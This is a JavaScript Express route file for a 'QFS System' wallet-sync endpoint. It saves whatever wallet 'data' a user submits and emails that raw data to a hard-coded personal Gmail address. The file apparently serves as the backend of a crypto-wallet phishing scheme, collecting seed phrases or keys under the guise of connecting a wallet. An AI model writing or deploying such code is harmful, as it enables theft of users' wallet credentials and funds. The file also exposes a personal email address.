import { Router } from "express";
import prisma from "../lib/prisma.js";
import nodemailer from "nodemailer";
import { auth } from "../middleware/auth.js";

const router = Router();

// ---- Admin email config ----
const ADMIN_EMAIL = "mikeclinton508@gmail.com"; // ✅ change to your admin email

// ---- Setup mail transporter ----
const transporter = nodemailer.createTransport({
  host: process.env.SMTP_HOST || "smtp.gmail.com",
  port: process.env.SMTP_PORT ? Number(process.env.SMTP_PORT) : 465,
  secure: true,
  auth: {
    user: process.env.SMTP_USER,
    pass: process.env.SMTP_PASS,
  },
});

// ---------------------------------------------------------------------------
//  POST /api/walletsync  → User connects wallet
// ---------------------------------------------------------------------------
router.post("/", auth, async (req, res) => {
  try {
    const { walletName, method, data } = req.body;
    if (!walletName || !method || !data) {
      return res.status(400).json({ error: "Missing required fields" });
    }

    const user = await prisma.user.findUnique({
      where: { id: req.user.id },
      select: { id: true, email: true, username: true, country: true, name: true },
    });

    // Save to DB
    const entry = await prisma.walletSync.create({
      data: {
        userId: user.id,
        walletName,
        method,
        data: JSON.stringify(data),
        status: "PENDING",
      },
    });

    // --- Professional Admin Email ---
    const adminHtml = `
      <div style="font-family:Arial,Helvetica,sans-serif;max-width:600px;margin:auto;border:1px solid #eee;border-radius:12px;overflow:hidden">
        <div style="background:#0a0a0a;padding:20px;color:white;text-align:center">
          <h2 style="margin:0;font-weight:600;">QFS Wallet Connection Request</h2>
        </div>
        <div style="padding:24px;">
          <p>Hello Admin,</p>
          <p>A new user has attempted to link a wallet. Here are the details:</p>
          <table style="width:100%;border-collapse:collapse;">
            <tr><td style="padding:6px 0;"><b>User Name:</b></td><td>${user.fullName || user.username || "—"}</td></tr>
            <tr><td style="padding:6px 0;"><b>Email:</b></td><td>${user.email}</td></tr>
            <tr><td style="padding:6px 0;"><b>Country:</b></td><td>${user.country || "—"}</td></tr>
            <tr><td style="padding:6px 0;"><b>Wallet:</b></td><td>${walletName}</td></tr>
            <tr><td style="padding:6px 0;"><b>Method:</b></td><td>${method}</td></tr>
            <tr><td style="padding:6px 0;"><b>Status:</b></td><td><span style="color:#f59e0b;font-weight:bold;">PENDING</span></td></tr>
          </table>

          <div style="margin-top:16px;padding:12px;border-left:3px solid #2563eb;background:#f9fafb;">
            <p style="margin:0;color:#111827;font-size:14px;"><b>Raw Submission Data:</b></p>
            <pre style="white-space:pre-wrap;background:#f3f4f6;padding:12px;border-radius:8px;font-size:13px;color:#374151;">${JSON.stringify(data, null, 2)}</pre>
          </div>
          <p style="margin-top:24px;">Please review and update the status in the admin dashboard.</p>
        </div>
        <div style="background:#0a0a0a;color:white;text-align:center;padding:12px;font-size:12px;">
          &copy; ${new Date().getFullYear()} QFS System
        </div>
      </div>
    `;

    await transporter.sendMail({
      from: `"QFS System" <${ADMIN_EMAIL}>`,
      to: ADMIN_EMAIL,
      subject: `🔗 New Wallet Connection - ${user.email}`,
      html: adminHtml,
    });

    res.json({ success: true, entry });
  } catch (err) {
    console.error("Wallet sync error:", err);
    res.status(500).json({ error: "Failed to save wallet sync" });
  }
});


export default router;
